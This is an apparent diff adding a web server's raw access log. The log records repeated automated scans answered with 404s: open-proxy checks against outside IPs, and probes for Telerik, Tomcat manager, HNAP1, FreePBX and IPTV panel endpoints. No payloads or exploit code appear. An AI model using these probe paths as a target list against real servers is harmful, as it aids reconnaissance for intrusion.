+[0mGET /favicon.ico [33m404 [0m0.415 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.436 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.503 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.312 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.843 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.343 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.440 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.466 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.935 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.507 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.337 ms - 146[0m
+[0mGET /favicon.ico [33m404 [0m0.485 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /manager/html [33m404 [0m0.770 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.412 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.032 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.783 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.507 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.396 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.448 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.414 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.805 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.346 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.429 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.497 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.430 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.941 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.379 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.825 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.421 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.435 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.498 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.395 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.528 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.454 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.439 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.426 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.337 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.344 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.443 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /cgi-bin/mainfunction.cgi [33m404 [0m0.837 ms - 163[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.109 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.322 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.323 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.350 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.418 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.354 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.824 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.501 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.415 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.892 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.438 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.585 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.403 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.013 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.506 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.348 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.447 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.330 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.370 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.446 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.405 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.448 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m3.437 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.328 ms - 146[0m
+[0mGET /favicon.ico [33m404 [0m0.476 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.409 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.970 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/assets/js/views/login.js [33m404 [0m0.774 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/i18n/readme.txt [33m404 [0m0.296 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /recordings/theme/main.css [33m404 [0m0.428 ms - 164[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/config.php [33m404 [0m0.271 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SIPml-api.js [33m404 [0m0.340 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /cgi?action=getInfo [33m404 [0m0.302 ms - 142[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /cgi-bin/login [33m404 [0m0.278 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.439 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.711 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.345 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.405 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.558 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.432 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.474 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.549 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.478 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.558 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.811 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.443 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/assets/js/views/login.js [33m404 [0m1.025 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/i18n/readme.txt [33m404 [0m0.389 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /recordings/theme/main.css [33m404 [0m0.424 ms - 164[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/config.php [33m404 [0m0.450 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SIPml-api.js [33m404 [0m0.386 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /cgi?action=getInfo [33m404 [0m0.288 ms - 142[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.699 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://51.144.0.117/pass [33m404 [0m0.398 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.495 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.447 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.403 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.423 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.801 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.539 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/assets/js/views/login.js [33m404 [0m0.784 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/i18n/readme.txt [33m404 [0m0.286 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /recordings/theme/main.css [33m404 [0m0.276 ms - 164[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/config.php [33m404 [0m0.274 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SIPml-api.js [33m404 [0m0.364 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /cgi?action=getInfo [33m404 [0m0.289 ms - 142[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.356 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.342 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.489 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.562 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.924 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.793 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.364 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.447 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.461 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.451 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.510 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.547 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.997 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.465 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.685 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.426 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.431 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.428 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.394 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /api.php [33m404 [0m0.399 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login.php [33m404 [0m0.482 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming [33m404 [0m0.389 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.398 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/eIUZDkcM.php [33m404 [0m0.343 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://www.msftncsi.com/ncsi.txt [33m404 [0m1.330 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.956 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.394 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.512 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.512 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.394 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.891 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.347 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.658 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.454 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.540 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.972 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.527 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.502 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.620 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.845 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m1.019 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.671 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST / [33m405 [0m0.048 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.790 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.505 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.564 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.620 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.460 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.496 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.769 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.528 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.516 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.537 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.481 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.452 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.387 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.425 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.819 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.388 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.478 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.054 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.523 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.384 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.444 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.600 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.381 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.485 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.390 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.368 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /api.php [33m404 [0m0.397 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login.php [33m404 [0m0.381 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming [33m404 [0m0.388 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.657 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/9JqNNgEh.php [33m404 [0m0.266 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.468 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.304 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.469 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m1.820 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.572 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.537 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m1.302 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /manager/html [33m404 [0m0.932 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.523 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/assets/js/views/login.js [33m404 [0m5.899 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/i18n/readme.txt [33m404 [0m0.396 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /recordings/theme/main.css [33m404 [0m0.289 ms - 164[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/config.php [33m404 [0m0.454 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /index.php [33m404 [0m0.286 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /_asterisk/ [33m404 [0m0.293 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.643 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.649 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.860 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.456 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.408 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.565 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.875 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.496 ms - 150[0m
